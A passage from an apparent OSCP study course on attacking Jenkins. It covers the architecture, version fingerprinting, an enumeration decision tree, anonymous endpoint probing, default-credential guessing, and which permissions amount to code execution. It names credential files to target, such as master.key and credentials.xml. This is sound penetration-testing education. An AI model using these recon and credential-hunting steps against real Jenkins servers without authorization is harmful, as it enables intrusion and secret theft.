# Attacking Jenkins on the OSCP — A Build → Understand → Break Course

> Deep study. This is the scaffolding, not the post. Neutral and exhaustive here;
> a distilled writeup can be carved out later. Sibling to the XAMPP attack course.
>
> **Thesis:** Jenkins is not a website you find bugs in — it is a *remote code execution
> engine that ships with a login page*. Its entire purpose is to take instructions and run
> them on servers: that's what CI/CD is. So the exam skill is almost never "find a memory
> corruption bug." It is: *recognise Jenkins, understand that it is built to execute code,
> then find the one path — a weak permission, a leaked token, an exposed Script Console, a
> readable credential, a vulnerable CLI — that lets me reach that execution engine.* Once
> you reach it, you are already running commands on the box.
>
> **Lens for the whole course — Build. Understand. Break.**
> First reconstruct how Jenkins is assembled — controller, agents, jobs, the Groovy core,
> the credentials store, the plugin sprawl — and how each piece is *designed* to run code
> (Build/Understand). Only then attack it, tracing every path back to that execution engine
> (Break). Every technique is tagged with *where trust is established* and *how it fails*.

---

## How to use this document

Written as a single linear course, fundamentals → advanced, but also a jump-in reference.

- **Study mode:** read Parts I–XXI in order. Build the model first (I–III), then the
  access-surfaces (IV–VII: unauth, auth, CLI, API), then the execution primitives (VIII–IX:
  Script Console, jobs), then credentials and chaining (X–XIV), then OS/privesc (XV–XVIII),
  then judgment and practice (XIX–XXV). Do the labs in Part XXII as you go.
- **Exam mode:** you found Jenkins on a box and need a plan. Jump to **Part XXIV — the
  Playbook** and **Part XXI — Time Management**. Everything else is the *why*.

**The one rule that matters more than any command:** Jenkins exists to run code, so the
question is never "can this thing be made to execute?" — it always can — but "which trust
boundary do I have to cross to get there, and what have they left open?" Every technique
below is a different door into the same room: arbitrary code execution on the controller or
an agent. Keep asking "how does this get me to the execution engine?"

### The pedagogical contract

Every major technique is developed through the same ten lenses. When you meet a new one,
you should be able to answer all ten:

1. **Concept** — what is it, mechanically?
2. **Why it matters** — why does an attacker care?
3. **Recognition** — how do I know it might be present?
4. **Enumeration** — how do I investigate it?
5. **Interpretation** — what does the result actually mean (and not mean)?
6. **Exploitation** — how does it become an attack path?
7. **Validation** — how do I *prove* it rather than assume it?
8. **Pivot** — where can it lead next?
9. **Failure cases** — when does it simply not work?
10. **OSCP relevance** — how likely is this in the exam, and how much time is it worth?

The big techniques (Script Console, the CLI file-read, credential decryption, job-based
RCE) get the headings explicitly so you can drill them; elsewhere the reasoning walks the
same path without printing all ten labels.

---

## Master table of contents

- **Part I** — Understanding the Jenkins attack surface
- **Part II** — Recognising Jenkins during enumeration
- **Part III** — The Jenkins enumeration methodology (master decision tree)
- **Part IV** — Unauthenticated enumeration
- **Part V** — Authentication & authorization modes
- **Part VI** — The Jenkins CLI (and CVE-2024-23897)
- **Part VII** — The REST API & remote access
- **Part VIII** — The Script Console (Groovy → RCE)
- **Part IX** — Build jobs & pipelines as an execution primitive
- **Part X** — Credential discovery & secret decryption
- **Part XI** — Common initial-access paths (8 scenarios)
- **Part XII** — The plugin attack surface
- **Part XIII** — Version-based vulnerability research (the famous Jenkins CVEs)
- **Part XIV** — Agents, nodes & lateral movement
- **Part XV** — Windows Jenkins
- **Part XVI** — Linux Jenkins
- **Part XVII** — Post-exploitation (Windows + Linux checklists)
- **Part XVIII** — Privilege escalation through Jenkins
- **Part XIX** — Tool-assisted methodology
- **Part XX** — Decision trees
- **Part XXI** — OSCP exam time management (5 / 15 / 30-minute methodology)
- **Part XXII** — Build a dedicated Jenkins attack lab (Docker + VM, 12 scenarios)
- **Part XXIII** — Failure modes: how Jenkins attacks go wrong
- **Part XXIV** — The OSCP Jenkins playbook
- **Part XXV** — Final practical challenge

---

# PART I — Understanding the Jenkins Attack Surface

Before you attack Jenkins you have to be able to *rebuild it in your head*. Jenkins is more
foreign to most people than a LAMP stack, so this Part is the essential Build/Understand
half — dry on purpose. The single most important idea to hold: **Jenkins is an
orchestration server whose job is to execute arbitrary build steps on machines it
controls.** Nearly every "vulnerability" is really *legitimate execution functionality
reached by someone who shouldn't have reached it.*

## 1.1 What Jenkins actually is

Jenkins is an open-source automation server written in Java, used for CI/CD (continuous
integration / continuous deployment). Developers define **jobs** (or **pipelines**) that
Jenkins runs automatically — compile code, run tests, build artifacts, deploy to servers.
To do that job it must be able to: run shell/batch commands, execute scripts, store and use
credentials (to reach git, cloud, servers, registries), and distribute work to other
machines (agents). Every one of those capabilities is an attacker's dream, because they are
*execution and secrets by design*.

Structurally, a Jenkins deployment is:

- **The controller** (historically "master") — the central Java web application. It serves
  the web UI (default TCP **8080**), stores all configuration and jobs in **JENKINS_HOME**,
  holds the **credentials store**, runs the **Script Console**, exposes the **CLI** and a
  **REST API**, and schedules builds. Compromising the controller is usually game over: it
  holds every secret and can run code on itself and every agent.
- **Agents** (historically "slaves"/"nodes") — worker machines the controller dispatches
  builds to, connecting on a JNLP/inbound port (default **50000**) or via SSH. A build
  configured to run "on agent X" executes its steps on agent X. Agents are lateral-movement
  targets *and* pivots back to the controller.
- **The Groovy engine** — Jenkins is deeply scriptable in Groovy (a JVM language). The
  **Script Console** runs arbitrary Groovy *on the controller* with full JVM privileges =
  instant RCE. Pipelines are also Groovy. Groovy is the beating heart of Jenkins' attack
  surface.
- **Jobs / pipelines** — the units of work. A "Freestyle" job has build steps ("execute
  shell", "execute Windows batch"); a "Pipeline" job runs a Groovy `Jenkinsfile`. Either is
  a *command-execution primitive* if you can create or edit one and trigger a build.
- **Credentials store** — Jenkins stores secrets (passwords, SSH keys, API tokens, cloud
  creds) encrypted in JENKINS_HOME, to inject into builds. Decrypting or exfiltrating these
  is a massive lateral-movement lever.
- **Plugins** — Jenkins' functionality is ~90% plugins (1800+ exist). This is an enormous,
  uneven attack surface: many historical RCE/auth-bypass/path-traversal CVEs live in
  plugins, not core.

## 1.2 The default installation structure — JENKINS_HOME

Everything stateful lives in **JENKINS_HOME**. Knowing this tree turns "get a shell" into
"read these specific files for every secret on the box." Default locations:

```text
Linux (deb/rpm):     /var/lib/jenkins/
Linux (war/manual):  ~/.jenkins/      (home of the user running the .war)
Docker official:     /var/jenkins_home/
Windows:             C:\ProgramData\Jenkins\.jenkins\   (service)  or  C:\Users\<user>\.jenkins\
```

Inside JENKINS_HOME (the files that matter to an attacker):

```text
JENKINS_HOME/
├── config.xml                     # global config: auth realm, authorization strategy, agent port
├── credentials.xml                # the CREDENTIAL STORE (encrypted secrets)  ← prime loot
├── secrets/
│   ├── master.key                 # used (with hudson.util.Secret) to decrypt credentials
│   ├── hudson.util.Secret         # the real AES key, itself encrypted by master.key
│   └── initialAdminPassword       # first-run admin password (sometimes left readable)
├── users/
│   └── <user>/config.xml          # per-user config incl. API token hash, password hash
├── jobs/
│   └── <job>/
│       ├── config.xml             # job definition: build steps (commands!), SCM creds refs
│       └── builds/<n>/log         # BUILD LOGS — frequently leak secrets, paths, tokens
├── nodes/<agent>/config.xml       # agent definitions (how the controller reaches agents)
├── plugins/                       # installed plugins (.jpi/.hpi) — version = CVE surface
├── updates/                       # plugin/update metadata
└── secret.key / secret.key.not-so-secret   # legacy
```

The three files that, together, unlock every stored secret: **`secrets/master.key`**,
**`secrets/hudson.util.Secret`**, and **`credentials.xml`** (plus any `credentials.xml`
inside `jobs/*/`). Part X is entirely about turning those into plaintext.

## 1.3 Typical ports and services

| Port | Service | Meaning on a Jenkins box |
|------|---------|--------------------------|
| 8080/tcp | Jenkins web UI (HTTP) | The front door: UI, `/script`, `/cli`, REST API. **The whole game usually starts here.** |
| 8443/tcp | Jenkins web UI (HTTPS) | Same, TLS. |
| 50000/tcp | JNLP / inbound agent port | Where agents connect. Confirms Jenkins; occasionally an attack surface. |
| 8080 behind 80/443 | reverse-proxied Jenkins | Often Jenkins sits behind nginx/Apache at `/` or `/jenkins/`. |
| 22/5985/3389 | SSH/WinRM/RDP | The OS, for privesc after you get the `jenkins` user. |

Also common: Jenkins reached at a **context path** (`http://target/jenkins/`) behind a
proxy, or on a **non-default port** (8081, 9090, 8180). Don't assume 8080 — a Jenkins can
hide on any HTTP port.

## 1.4 The layered / trust model — every layer leads to code execution

Here is the mental model to carry through the course. Unlike a web-app stack that descends
network→app→db, Jenkins is better drawn as **concentric access rings around one execution
core**:

```text
   Network              ← scan: 8080/8443/50000, X-Jenkins header, version
      │
      ▼
   Web front (unauth)   ← what anonymous can see/do: version, users, /script?, /cli?
      │
      ▼
   Authentication       ← who can log in: anonymous-read? open signup? weak/default creds?
      │
      ▼
   Authorization        ← what my identity can DO: "anyone can do anything"? Overall/Read?
      │                    Job/Build? Overall/RunScripts? Overall/Administer?
      ▼
   ── EXECUTION CORE ──  ← Script Console (Groovy) / Job build steps / CLI / vulnerable plugin
      │                    ANY of these = code execution as the Jenkins process user
      ▼
   Jenkins process user ← 'jenkins' (Linux) / a service account or SYSTEM (Windows)
      │
      ├──► Credentials store  → decrypt secrets → reuse against git/cloud/SSH/other hosts
      ├──► Agents             → run code on every connected agent (lateral movement)
      └──► Local privesc      → jenkins user → root/SYSTEM (sudo, service acct, secrets)
```

Read the rings as *how far in an attacker has gotten*. The critical insight: **the
authorization ring is the real perimeter, not authentication.** A Jenkins can let anonymous
users read everything, or even run scripts, if the authorization strategy is loose. Many
Jenkins compromises are not "I bypassed login" but "I logged in (or didn't need to) and my
identity had `Overall/RunScripts` or job-create rights, which *is* RCE by design." So the
question at each ring is not "can I break in?" but "what does the identity I already have
let me *execute*?"

- **Network → Web front:** the scan finds 8080 + the `X-Jenkins` header; the front page
  and a few endpoints tell you version, whether anonymous can read, and whether `/script`
  or `/cli` are reachable.
- **Web front → Auth:** can I get an identity? Anonymous read enabled? Open user
  registration? Default/weak admin creds? A leaked API token? A pre-auth CVE that doesn't
  need one?
- **Auth → Authorization:** *this is the pivotal ring.* What can my identity do?
  `Overall/Read` (just look), `Job/Configure`+`Job/Build` (create/run jobs = RCE),
  `Overall/RunScripts` (Script Console = RCE), `Overall/Administer` (everything)?
- **Authorization → Execution core:** whichever execution primitive my rights unlock —
  Script Console, a build step, the CLI, a vulnerable plugin — runs code as the Jenkins
  user.
- **Execution core → everything else:** as the Jenkins user I read `credentials.xml` +
  `master.key` + `hudson.util.Secret` and decrypt every stored secret (reuse!), I push code
  to agents (lateral), and I escalate `jenkins`→root/SYSTEM locally.

## 1.5 What should immediately attract attention

When Jenkins is confirmed, get eyes on these within the first minutes, ranked by how often
they're the way in:

1. **The Script Console at `/script`** — if reachable (anonymous or after any login),
   it's *instant* RCE. Check it first. (Part VIII.)
2. **Authentication/authorization posture** — anonymous read? open signup? "anyone can do
   anything"? default `admin:admin`? A leaked/weak login that has script or job rights.
   (Part V.)
3. **Version** — Jenkins core and plugin versions map to a *rich* set of high-impact CVEs
   (the CLI file-read CVE-2024-23897, the Stapler RCE CVE-2018-1000861, Script Security
   sandbox bypasses). Unlike XAMPP, Jenkins version-CVEs are frequently the intended path.
   (Part XIII.)
4. **The CLI at `/cli`** — pre-auth command surface; CVE-2024-23897 turns it into arbitrary
   file read (→ read `secrets/*` and `credentials.xml`, or `initialAdminPassword`). (Part
   VI.)
5. **Job creation / configuration rights** — if my identity can make or edit a job, its
   build step is a command shell. (Part IX.)
6. **Credentials store** — the endgame lever; once you have RCE or file read, decrypt it.
   (Part X.)
7. **Agents on 50000 / node config** — lateral movement surface. (Part XIV.)

Notice: unlike the XAMPP course, "check the version for a CVE" is *high* on this list.
Jenkins' plugin-heavy, RCE-by-design nature means precise version-matched CVEs (especially
CVE-2024-23897 and the 2018 Stapler RCE) are genuinely common exam and real-world paths —
though the *discipline* of validating them (Part XIII) still applies.

## 1.6 The Windows vs Linux split (previewed)

- **Linux:** Jenkins runs as the unprivileged **`jenkins`** user; JENKINS_HOME is
  `/var/lib/jenkins`. RCE gives you `jenkins`; privesc (Part XVI/XVIII) is `jenkins`→root
  via sudo, secrets, or reused credentials.
- **Windows:** Jenkins is frequently installed as a **service running as `LocalSystem`** (or
  a privileged service account). So — exactly like XAMPP-on-Windows — RCE via the Script
  Console or a job build step often lands you as **SYSTEM immediately**, no privesc needed.
  Always `whoami` first. (Part XV.)

Hold this map. Everything after it is Break, and it only makes sense once you see that every
door opens into the same room: code execution as the Jenkins user.

---

# PART II — Recognising Jenkins During Enumeration

Jenkins is one of the easier technologies to fingerprint because it *announces itself* in a
dedicated HTTP header and a distinctive UI. But recognition goes beyond "it's Jenkins" — you
want, fast: the **version** (drives the whole CVE question), whether it's reachable
**directly or behind a proxy/context-path**, and the earliest read on **anonymous access**.
As in any recognition work, separate *what I see* from *what it suggests* from *what it does
NOT prove* from *what I do next*.

## 2.1 From the Nmap results

**What I see:**

```text
$ nmap -sC -sV -p- --min-rate 2000 10.10.10.80
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1
8080/tcp  open  http       Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
| http-robots.txt: 1 disallowed entry
|_http-open-proxy: Proxy might be redirecting requests
| http-headers:
|_  X-Jenkins: 2.426.1
50000/tcp open  http       Jetty (Jenkins agent)
```

**What it suggests:** textbook Jenkins. Four tells stack up: **Jetty** as the HTTP server
(Jenkins' embedded servlet container — a strong hint on its own), the `http-title`
`... [Jenkins]`, the **`X-Jenkins: 2.426.1`** header (the version, handed to you), and
**port 50000** (the JNLP agent port — nearly unique to Jenkins). **What it does NOT prove:**
that anonymous users can do anything useful, that `/script` is reachable, or that the
version is honest (rarely edited on the exam). Port 50000 being open doesn't mean an agent
exploit is available. **What I do next:** browse `:8080`, grab the version from
`X-Jenkins`, immediately probe `/login`, `/script`, `/cli`, `/asynchPeople/`, and check
what anonymous can see.

A note on **proxied Jenkins:** you may instead see `80/tcp Apache` or `nginx` and *no*
8080. Jenkins often lives behind a reverse proxy at `/`, `/jenkins/`, or a vhost. So on any
web box, checking for a Jenkins context path (2.4) is part of recognition even when 8080
isn't open.

## 2.2 From HTTP headers — the `X-Jenkins` family

**What I see:**

```text
$ curl -sI http://10.10.10.80:8080/
HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
X-Jenkins: 2.426.1
X-Jenkins-Session: 5f3c...
X-Hudson: 1.395
X-Hudson-CLI-Port: 50000
X-Jenkins-CLI-Port: 50000
X-Jenkins-CLI2-Port: 50000
X-SSH-Endpoint: 10.10.10.80:52999
Set-Cookie: JSESSIONID.abc123=...; Path=/; HttpOnly
```

The recognition/interpretation table:

| Header | Suggests | Doesn't prove | Next |
|--------|----------|---------------|------|
| `X-Jenkins: 2.426.1` | It's Jenkins; **exact version** | version is exploitable | Part XIII CVE mapping |
| `X-Hudson` | Jenkins (legacy Hudson lineage) | anything about access | confirm Jenkins |
| `X-Jenkins-CLI-Port` / `X-Hudson-CLI-Port` | the CLI is enabled + its port | CLI is exploitable | Part VI (CVE-2024-23897) |
| `X-SSH-Endpoint` | SSH-based CLI available | you have creds/keys for it | note for authed CLI |
| `X-Jenkins-Session` | a live Jenkins instance | — | — |

**The version header is the single most valuable recognition datum on a Jenkins box** —
unlike most software, Jenkins hands you an exact version by default, and that version is
directly actionable (Part XIII). If the header is stripped by a proxy, recover the version
from `/login` page footer, the `/api/json` tree, or a static asset path (2.6).

## 2.3 From the login page, dashboard, and titles

**What I see:** browsing `:8080` either shows the **Dashboard** (if anonymous read is on) or
redirects to **`/login?from=%2F`** with the Jenkins login form. Page title contains
`[Jenkins]`. The login page footer often prints `Jenkins 2.426.1`.

**Suggests:** confirmed Jenkins; *and the first read on anonymous access* — if you land on a
populated Dashboard without logging in, **anonymous read is enabled** (a finding in itself,
Part V). **Doesn't prove** you can do anything beyond read. **Next:** if you see the
dashboard, enumerate everything anonymous can reach (Part IV). If you're bounced to login,
you still probe unauthenticated endpoints and the CLI, which don't always require the UI
session.

## 2.4 From context paths and reverse proxies

**What I see / do:** on a box where 8080 isn't open but 80/443 is, probe for Jenkins:

```text
$ for p in / /jenkins/ /ci/ /build/ /jenkins/login /cjoc/; do
    printf '%-16s ' "$p"; curl -s -o /dev/null -w '%{http_code} ' "http://target$p"
    curl -sI "http://target$p" | grep -i x-jenkins; echo; done
```

**Suggests:** an `X-Jenkins` header at any path = Jenkins behind that proxy/context.
**Doesn't prove** the version isn't masked (proxies sometimes strip headers — fall back to
footer/asset fingerprinting). **Next:** treat that context path as your Jenkins base URL for
all further enumeration.

## 2.5 From the favicon and static assets

**What I see:** Jenkins' favicon and static assets have stable hashes/paths. The favicon
hash is a reliable fingerprint even when headers are stripped; static assets are served
under a **version-stamped path**:

```text
/static/<hex-or-version>/images/...     # the segment often encodes the build
/adjuncts/<hash>/...
```

**Suggests:** Jenkins (favicon), and sometimes the version (asset path). **Next:** favicon
hashing (e.g. via a fingerprint tool) confirms Jenkins on a hardened front; the asset path
can recover a stripped version.

## 2.6 Recovering the version when the header is stripped

Several fallbacks, in order:

```text
$ curl -s http://target/login | grep -Eo 'Jenkins [0-9.]+'        # footer
$ curl -s http://target/api/json | head                            # sometimes leaks in errors
$ curl -sI http://target/ | grep -iE 'x-jenkins|x-hudson'          # the obvious one
$ curl -s http://target/oops/ | grep -Eo 'Jenkins ver\. [0-9.]+'   # error pages print version
```

Jenkins error pages (a deliberately bad path like `/oops/`) print `Jenkins ver. 2.426.1` in
the footer — a robust version oracle when the header is gone.

## 2.7 From the CLI and agent ports

Port **50000** open (JNLP inbound agents) is a near-unique Jenkins tell. The **CLI** may be
reachable over HTTP (`/cli`) and/or a dedicated port; the `X-Jenkins-CLI-Port` header and
`/cli` endpoint confirm it. These both confirm Jenkins *and* flag two attack surfaces (agent
port → Part XIV; CLI → Part VI).

## 2.8 The cumulative case

You've confirmed Jenkins when several agree: `X-Jenkins`/`X-Hudson` headers; Jetty server +
`[Jenkins]` title; port 50000; the `/login` form with a Jenkins footer; the favicon hash.
Any one alone (say, just "Jetty") is a hypothesis; the header plus the title is conclusive.
**Write these constants at the top of your notes: exact version, base URL/context path,
whether anonymous read works, whether `/script` and `/cli` respond.** They drive everything
else. *OSCP relevance:* recognition is fast and high-confidence here; the payoff is that the
*version* it hands you is immediately actionable, so don't rush past it.

---

# PART III — The Jenkins Enumeration Methodology (Master Decision Tree)

Parts IV–XIV are deep dives; this Part is the spine that orders them and — crucially —
front-loads the *free instant wins* (an open Script Console, a pre-auth CVE) that make
Jenkins different from most targets. On a lot of Jenkins boxes the "enumeration" is over in
five minutes because `/script` was open or the version has a pre-auth RCE. So the governing
principle here is: **check the instant-RCE shortcuts first, then fall back to methodical
breadth.**

## 3.1 The master tree

```text
Jenkins discovered  (Part II confirmed it)
        │
        ▼
[1] Get the version ────────► X-Jenkins header / footer / error page. Note it NOW.
        │
        ▼
[2] Instant-win checks (do these FIRST — each can be game over in one request)
        ├─ /script reachable (anon or trivial login)? ─► Groovy RCE  → jump to Part VIII
        ├─ Version has a pre-auth RCE / file-read? ─────► e.g. CVE-2024-23897 → Part VI/XIII
        └─ Default/blank/known creds work? ─────────────► login → check rights → Part V
        │
        ▼  (if no instant win)
[3] Determine anonymous access ─► dashboard visible? users list? job configs readable? (IV)
        │
        ▼
[4] Determine how to get an identity ─► open signup? weak creds? leaked token? (V)
        │
        ▼
[5] Determine authorization of that identity ─► Read? Job/Build? RunScripts? Administer? (V)
        │
        ▼
[6] Map execution primitives my rights unlock
        ├─ Script Console (Overall/RunScripts or Administer) ──► Part VIII
        ├─ Create/configure a job (Job/Create+Configure+Build) ─► Part IX
        ├─ CLI commands (some pre-auth) ───────────────────────► Part VI
        └─ Vulnerable plugin (version-matched) ────────────────► Part XII/XIII
        │
        ▼
[7] Reach code execution as the Jenkins user
        │
        ▼
[8] Loot & pivot
        ├─ Decrypt the credentials store ─────► reuse everywhere (Part X)
        ├─ Move to agents ────────────────────► lateral (Part XIV)
        └─ Local privesc jenkins→root/SYSTEM ─► (Part XVIII)
```

## 3.2 Every branch, with reasoning

**[1] Version.** *Enumerate:* header/footer/error page (Part II.6). *Why:* Jenkins version
+ plugin versions are a *primary* attack vector here (unlike XAMPP). *High value:* a version
with a pre-auth RCE/file-read (CVE-2024-23897 for 2.441/LTS 2.426.1 and below;
CVE-2018-1000861 for ≤2.153). *Low value:* a fully-patched current LTS with hardened auth.
*Next:* Part XIII mapping — but keep going, don't tunnel on a CVE before the free checks.

**[2] Instant-win checks.** *Enumerate:* `curl /script`, test the version's pre-auth CVE,
try `admin:admin`/blank. *Why:* Jenkins uniquely offers *one-request* compromises; skipping
them to do "thorough enumeration" first is wasted time. *High value:* any of the three
hitting. *When to stop:* the moment one gives RCE/file-read — you're into loot/pivot. *Pivot:*
none hit → methodical path.

**[3] Anonymous access.** *Enumerate:* browse without auth; hit `/`, `/asynchPeople/`
(user list), `/view/all/`, a `job/*/config.xml`, `/api/json`. *Why:* loose authorization
often lets anonymous *read* (users, job configs, build logs → creds!) or even *run scripts*.
*High value:* readable job configs/build logs (leak secrets), readable user list (spray
targets), an anonymous `/script`. *Low value:* a locked-down instance that 403s everything
anonymous. *Next:* harvest anything readable; then work on getting an identity.

**[4] Get an identity.** *Enumerate:* is signup open (`/signup`)? default/weak creds? a
token/cred leaked elsewhere (git, another service, a build log)? *Why:* an identity is the
usual prerequisite to an execution primitive. *High value:* open registration, or working
creds, *especially if that account has script/job rights*. *Low value:* an account with only
`Overall/Read`. *Next:* determine what the identity can do.

**[5] Authorization.** *Enumerate:* after login, does `/script` load? Can you see
"New Item"/create a job? Is there a "Manage Jenkins"? *Why:* **this is the real perimeter** —
authentication without authorization to execute is a read-only dead end; authorization to
execute *is* the win. *High value:* `Overall/RunScripts`, `Overall/Administer`,
`Job/Configure`+`Build`. *Low value:* `Overall/Read` only (harvest info, look for another
path). *Next:* map to primitives.

**[6] Execution primitives.** *Enumerate:* which of Script Console / job build step / CLI /
plugin your rights + the version unlock. *Why:* each is a route to the same RCE. *Next:*
pick the cleanest (Script Console if available — one request; else a job; else CLI/plugin).

**[7] Code execution.** You now run commands as the Jenkins user. `whoami`/`id` — on Windows
you may already be SYSTEM.

**[8] Loot & pivot.** *Enumerate:* `credentials.xml` + `secrets/*` (decrypt — Part X),
agents (Part XIV), local privesc (Part XVIII). *Why:* the controller is a secrets vault and
a hub to other machines; the foothold is the *start*, not the end.

## 3.3 Stop / pivot heuristics

- **Take the instant win.** If `/script` is open or a pre-auth CVE fits, do it — don't
  "finish enumerating" first. Jenkins rewards the shortcut.
- **Authorization over authentication.** Don't celebrate a login until you know it can
  *execute* something. An `Overall/Read`-only account is not a foothold; it's an
  info-gathering position — use it to find a path to execution, don't grind it.
- **The version is a first-class lead here.** Unlike XAMPP, seeing the version should
  *immediately* make you check the marquee CVEs (2024-23897, 2018-1000861) — they're common
  intended paths. But still validate (Part XIII), don't fire blind.
- **Don't ignore read access.** Readable job configs and build logs leak credentials and
  command lines constantly. "Only anonymous read" still frequently yields the creds that
  unlock everything.

Everything from Part IV onward is a magnifying glass on one branch. Keep this tree in view;
its job is to make you take the free RCE when it's there and enumerate methodically when it
isn't.

---

# PART IV — Unauthenticated Enumeration

Before you have any identity, Jenkins often leaks a surprising amount — sometimes enough to
walk straight in. This Part is the systematic sweep of what an anonymous user can reach, and
why each endpoint matters. The theme: **loose authorization frequently lets "anonymous" read
job configs, build logs, and the user list — and occasionally run scripts.** Every one of
those reads can contain a credential.

## 4.1 The unauthenticated endpoint sweep

Hit these first; each answers a specific question:

```text
/                      # Dashboard visible unauth? → anonymous read is ON
/login                 # confirms Jenkins + version footer
/api/json?pretty=true  # instance metadata; often readable anon (jobs, views, nodeName)
/asynchPeople/         # the USER LIST → spray/target these usernames
/people/               # same, user list
/script                # Script Console — anon RCE if it loads (jackpot)
/scriptText            # non-UI script endpoint
/cli                   # CLI endpoint present?
/systemInfo            # env vars, system properties (needs rights, but try)
/whoAmI/               # who am I right now + my authorities/permissions
/view/all/newJob       # can anon create a job?
/computer/             # nodes/agents list
/oops/  (any bad path) # error page prints "Jenkins ver. x.y.z"
/robots.txt            # disallowed paths hint at structure
```

Interpretation of the two most valuable:

- **`/whoAmI/`** is the single best "what am I allowed to do" oracle. It shows your current
  authentication (`anonymous` if none) *and your granted authorities/permissions*. Check it
  before and after any login.

```text
$ curl -s http://target:8080/whoAmI/api/json?pretty=true
{ "name": "anonymous", "authenticated": false,
  "authorities": [ "anonymous" ] , ... }
```

- **`/asynchPeople/`** (and `/people/`) enumerates every Jenkins user — invaluable for
  credential spraying and for knowing *who* the admin is.

## 4.2 What anonymous read exposes (and why it's dangerous)

If the dashboard loads without login, systematically read:

- **Job configurations** — `http://target/job/<name>/config.xml`. A job's config contains
  its build steps (command lines!), SCM URLs, and *references* to credentials. Sometimes
  plaintext secrets or an embedded token. This is a top credential source.
- **Build logs** — `http://target/job/<name>/<buildNumber>/consoleText`. Build logs are a
  notorious secret leak: echoed environment variables, `git clone https://user:token@...`
  URLs, deploy commands with passwords, API responses. **Read the console output of recent
  builds of every readable job.**
- **Workspace** — `http://target/job/<name>/ws/` — the checked-out source, which may contain
  `.git`, config files, `.env`, keys.
- **The user list** (4.1) and each user's public profile.
- **`/api/json`** trees — job names, view structure, node names, descriptions.

*OSCP relevance:* very high — an anonymous-read Jenkins with a talkative build log is a
frequent free-credential source, and the creds usually unlock the execution primitives.

## 4.3 Interpretation — read vs execute

The discipline: distinguish "anonymous can *read* X" from "anonymous can *do* X." Reading a
job config is information; the job's build step only runs when *built*, which usually needs
`Job/Build`. So an anonymous-readable instance is a goldmine of *information* (creds,
structure, version) that you then use to get an *identity with execution rights*. Don't
mistake broad read access for a foothold — but don't undervalue it either; the creds it
leaks are often the whole path.

## 4.4 Failure cases

A hardened Jenkins 403s everything anonymous (`Authentication required`) and strips the
version header behind a proxy. Then unauthenticated enumeration yields only "it's Jenkins,
version X (from the error page)," and you pivot to: getting an identity (Part V), or a
*pre-auth* CVE that doesn't need the UI session (Part VI's CVE-2024-23897 is exactly this —
it reads files with only anonymous, even when the UI is locked). *That last point is key:*
"anonymous can't read anything in the UI" does **not** mean "anonymous can't read files" —
the CLI file-read CVE often works precisely on these locked-down instances.

---

# PART V — Authentication & Authorization Modes

This is the pivotal Part, because in Jenkins **authorization is the real security boundary,
not authentication.** A correctly-understood Jenkins attack is usually "my identity (maybe
just anonymous) has a permission that amounts to code execution." So you must understand the
security realms (who can log in) and the authorization strategies (what identities can do),
and how their misconfigurations become footholds.

## 5.1 Security realms — how identities are established

The **Security Realm** decides authentication. Common ones and their attacker relevance:

- **Jenkins' own user database** — local accounts. *Attacker angle:* default/weak creds
  (`admin:admin`, `admin:password`, creds leaked elsewhere); **open signup** if
  "Allow users to sign up" is enabled → you register your own account.
- **Delegate to servlet container / LDAP / AD / SSO / OAuth** — external auth. *Angle:*
  creds harvested elsewhere may work; LDAP/AD misconfig; less commonly the direct path on
  OSCP.
- **"Anyone can do anything" / no security** — legacy/dev instances with security
  *disabled*: every request is effectively admin. *Angle:* instant full access — `/script`
  just works. Rare on modern installs but a lab/CTF staple.

**Open signup** is the classic Jenkins-specific auth weakness. Check `/signup`:

```text
$ curl -s http://target:8080/signup | grep -i 'create an account'
# if the signup form exists → register:
POST /securityRealm/createAccount  (username, password, ...) → you now have an account
```

Whether that account is *useful* depends entirely on authorization (5.2) — often a fresh
account gets whatever the "Authenticated" group is granted, which on a loose instance can be
a lot.

## 5.2 Authorization strategies — what identities can do

The **Authorization Strategy** is where the real risk lives:

- **"Anyone can do anything"** — every user (incl. anonymous) is admin. Instant `/script`
  RCE.
- **"Legacy mode"** — admins are admin, everyone else read-only. Anonymous read.
- **"Logged-in users can do anything"** — *any* authenticated user is effectively admin. So
  **open signup + this strategy = register an account → full admin → Script Console RCE.**
  This pairing is one of the most common Jenkins footholds; recognise it.
- **Matrix-based security** — a permission grid: per-user/group, checkboxes for
  `Overall/Read`, `Overall/Administer`, `Overall/RunScripts`, `Job/Build`, `Job/Configure`,
  `Job/Create`, `Agent/*`, `Credentials/*`, etc. *Angle:* the misconfig is a checkbox that
  shouldn't be ticked for `anonymous` or `authenticated` — most dangerously
  `Overall/Administer` or `Overall/RunScripts` (both = RCE), or the job-create/configure/
  build trio (also RCE, via Part IX).
- **Project-based matrix** — like matrix but with per-job overrides.

## 5.3 The permissions that equal code execution

Memorise which permissions are *effectively RCE*, because that's what you're hunting in the
grid:

- **`Overall/Administer`** — total control; Script Console, manage everything. Full RCE.
- **`Overall/RunScripts`** — access to the Script Console and `/script` = Groovy RCE on the
  controller. Full RCE *without* being a full admin.
- **`Job/Create` + `Job/Configure` + `Job/Build`** (or `Job/Configure`+`Build` on an
  existing job) — create/edit a job with a shell build step and run it = RCE (Part IX).
- **`Agent/Configure` / node script rights** — run Groovy on an agent.
- **`Credentials/*` (view)** — read/exfiltrate stored secrets (some plugins/older versions
  leak plaintext).
- **`Overall/Read` alone** — *not* execution; read-only. Info-gathering only.

So when you get an identity, the very next question (via `/whoAmI/`, and by seeing which UI
options appear) is: **do I have any of the RCE-equivalent permissions above?** If yes, go
execute. If only `Overall/Read`, keep hunting for a path.

## 5.4 Default & weak credentials

*Enumerate:* try `admin:admin`, `admin:password`, `jenkins:jenkins`, `admin:` (blank), and
any creds harvested from build logs/git/other services (reuse). Also the **first-run admin
password**: `secrets/initialAdminPassword` in JENKINS_HOME — if you have file read (Part VI
CVE) or anonymous file access, that *is* the admin password on a freshly-setup instance.
*Validation:* a successful login that shows "Manage Jenkins" = admin. *Failure:* modern
Jenkins forces a strong admin password at setup, so blind default-cred success is rarer than
it used to be — but reused/leaked creds are common. *OSCP relevance:* high, especially the
open-signup-plus-loose-authorization pairing and reused creds from build logs.

## 5.5 API tokens

Jenkins users have **API tokens** (used instead of passwords for API/CLI). A leaked token
(in a build log, a script, a git repo, an env var) authenticates as that user without their
password:

```text
$ curl -s -u "alice:<api-token>" http://target:8080/whoAmI/api/json
# or as the crumb-authenticated identity for the CLI/API
```

Tokens are stored (hashed) in `users/<user>/config.xml` — post-exploitation you can't
